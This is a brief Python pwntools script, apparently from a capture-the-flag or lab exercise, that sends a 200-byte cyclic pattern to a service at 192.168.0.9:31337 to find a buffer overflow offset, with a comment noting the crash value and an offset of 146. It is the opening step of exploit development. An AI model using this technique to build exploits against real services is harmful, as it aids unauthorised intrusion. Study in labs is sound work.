#!/usr/bin/env python3
from pwn import *
r = remote('192.168.0.9',31337)

r.send(cyclic(200).decode()+"\n")
resp = r.recv()
print(str(resp))

# tried to go to 616d6261 -> amba -> cyclic_find(abma) = 146



